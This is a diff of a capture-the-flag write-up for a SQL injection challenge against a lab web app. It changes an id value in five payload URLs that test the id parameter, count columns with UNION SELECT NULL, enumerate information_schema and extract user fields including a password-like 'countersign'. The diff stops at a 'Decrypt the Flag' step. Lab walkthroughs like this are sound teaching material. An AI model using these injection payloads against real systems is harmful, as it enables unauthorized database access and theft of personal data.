@@ -11,33 +11,33 @@ This challenge involves exploiting a SQL Injection vulnerability in a web applic
 1. **Test for Vulnerability**:
    - Start by testing if the `id` parameter is vulnerable to SQL Injection. Modify the `id` parameter to:
      ```
-     http://10.14.59.254/?page=member&id=1+OR+1=1+--+&Submit=Submit#
+     http://10.14.59.254/?page=member&id=5+OR+1=1+--+&Submit=Submit#
      ```
    - If the page behaves differently, it confirms the presence of a SQL Injection vulnerability.
 
 2. **Find Columns**:
    - Next, determine the number of columns in the query using the following payload:
      ```
-     http://10.14.59.254/?page=member&id=1+UNION+SELECT+NULL,NULL+--+&Submit=Submit#
+     http://10.14.59.254/?page=member&id=5+UNION+SELECT+NULL,NULL+--+&Submit=Submit#
      ```
    - Adjust the number of `NULL` values if needed, until the page loads correctly. This will help you find the correct number of columns.
 
 3. **Explore Schema**:
    - Once the columns are identified, explore the database schema to retrieve information about the tables and columns. Use the following query:
      ```
-     http://10.14.59.254/?page=member&id=1+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+--+&Submit=Submit#
+     http://10.14.59.254/?page=member&id=5+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+--+&Submit=Submit#
      ```
 
 4. **Focus on the Users Table**:
    - To narrow down the search, focus on the `users` table and retrieve its column names by using:
      ```
-     http://10.14.59.254/?page=member&id=1+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_name='users'+--+&Submit=Submit#
+     http://10.14.59.254/?page=member&id=5+UNION+SELECT+table_name,column_name+FROM+information_schema.columns+WHERE+table_name='users'+--+&Submit=Submit#
      ```
 
 5. **Retrieve Data**:
    - Now, use the information from the previous steps to retrieve user data. To extract sensitive data for the user with `user_id=5`, use:
      ```
-     http://10.14.59.254/?page=member&id=1+UNION+SELECT+NULL,CONCAT(first_name,last_name,town,country,planet,Commentaire,countersign)+FROM+users+WHERE+user_id=5+--+&Submit=Submit#
+     http://10.14.59.254/?page=member&id=5+UNION+SELECT+NULL,CONCAT(first_name,last_name,town,country,planet,Commentaire,countersign)+FROM+users+WHERE+user_id=5+--+&Submit=Submit#
      ```
 
 6. **Decrypt the Flag**:
